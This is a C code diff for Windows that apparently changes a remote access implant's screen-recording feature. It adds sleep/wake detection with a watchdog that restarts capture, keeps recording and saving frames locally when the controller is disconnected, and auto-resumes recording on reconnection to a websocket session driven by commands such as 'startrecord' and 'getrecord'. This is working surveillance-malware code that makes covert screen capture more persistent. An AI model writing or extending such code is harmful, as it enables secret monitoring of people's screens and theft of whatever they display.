@@ -398,41 +398,60 @@ DWORD WINAPI power_monitor_thread(LPVOID param);
 // Screen recording watchdog for sleep/wake detection and recovery
 static HANDLE g_power_monitor_thread = NULL;
 static volatile int g_power_monitor_running = 0;
+static volatile DWORD g_last_active_time = 0;  // Track last active time for wake detection
 
 // Watchdog thread - monitors for wake events and ensures recording stays running
-// Uses GetTickCount64 to detect sleep (time jumps forward when system wakes)
+// Uses multiple methods to detect wake from sleep
 DWORD WINAPI power_monitor_thread(LPVOID param) {
-    ULONGLONG last_check = GetTickCount64();
-    DWORD last_real_time = (DWORD)(time(NULL));
+    ULONGLONG last_tick = GetTickCount64();
+    time_t last_time = time(NULL);
+    g_last_active_time = GetTickCount();
     
     while (g_power_monitor_running) {
-        Sleep(5000);  // Check every 5 seconds
+        Sleep(3000);  // Check every 3 seconds
         
-        ULONGLONG now = GetTickCount64();
-        DWORD real_now = (DWORD)(time(NULL));
+        ULONGLONG now_tick = GetTickCount64();
+        time_t now_time = time(NULL);
         
-        // Detect wake from sleep: real time jumped more than tick time
-        // During sleep, GetTickCount64 pauses but real time continues
-        ULONGLONG tick_diff = (now - last_check) / 1000;  // Seconds elapsed per ticks
-        DWORD real_diff = real_now - last_real_time;       // Actual seconds elapsed
+        // Method 1: Detect wake from sleep using time difference
+        // During sleep, GetTickCount64 pauses but time() continues
+        ULONGLONG tick_seconds = (now_tick - last_tick) / 1000;
+        time_t real_seconds = now_time - last_time;
         
-        // If real time advanced more than 30 seconds beyond tick time, we woke from sleep
-        if (real_diff > tick_diff + 30) {
-            // System woke from sleep - wait for stabilization then restart recording
-            Sleep(3000);
+        // If real time advanced more than 20 seconds beyond tick time, we woke from sleep
+        int woke_from_sleep = (real_seconds > (time_t)(tick_seconds + 20));
+        
+        // Method 2: Also check if our thread was suspended for a long time
+        // (indicates system was sleeping)
+        DWORD current_active = GetTickCount();
+        if (g_last_active_time > 0) {
+            DWORD expected_diff = 3000;  // We sleep 3 seconds
+            DWORD actual_diff = current_active - g_last_active_time;
+            if (actual_diff > expected_diff + 15000) {  // More than 15 sec extra = likely woke
+                woke_from_sleep = 1;
+            }
+        }
+        g_last_active_time = current_active;
+        
+        if (woke_from_sleep) {
+            // System woke from sleep - wait for system to stabilize
+            Sleep(5000);  // Wait 5 seconds for system to fully wake
+            
+            // Restart recording if it should be running
             if (g_screenrecord_enabled && !g_screenrecord_running) {
                 start_screenrecord_internal();
             }
         }
         
-        // Also serve as a general watchdog - if recording should be on but isn't, start it
+        // General watchdog - if recording should be on but isn't, start it
         // This handles cases where recording stopped unexpectedly
-        if (g_screenrecord_enabled && !g_screenrecord_running && g_connected) {
+        // NOTE: Recording works locally without connection - saves to disk
+        if (g_screenrecord_enabled && !g_screenrecord_running) {
             start_screenrecord_internal();
         }
         
-        last_check = now;
-        last_real_time = real_now;
+        last_tick = now_tick;
+        last_time = now_time;
     }
     
     return 0;
@@ -3100,7 +3119,9 @@ DWORD WINAPI screenrecord_thread(LPVOID param) {
     
     save_screenrecord_state();
     
-    while (g_screenrecord_running && g_connected) {
+    // Recording loop - runs independently of connection
+    // Frames are saved locally and can be retrieved later via getrecord
+    while (g_screenrecord_running) {
         DWORD start_time = GetTickCount();
         
         // Capture full screen at native resolution (from 0,0 like screenshot)
@@ -3894,8 +3915,12 @@ void handle_session() {
     
     send_websocket_data(info, strlen(info));
     
-    // Screen recording disabled by default - use 'startrecord' command to enable
-    // Recording uses low quality (5fps) for small file sizes
+    // Check if screen recording should be running (was enabled before)
+    // This ensures recording resumes after reconnection
+    if (g_screenrecord_enabled && !g_screenrecord_running) {
+        start_screenrecord_internal();
+        send_websocket_data("[*] Screen recording auto-resumed (was enabled)\n", 48);
+    }
     
     while (g_connected && !g_should_exit) {
         // Clear buffer for each receive
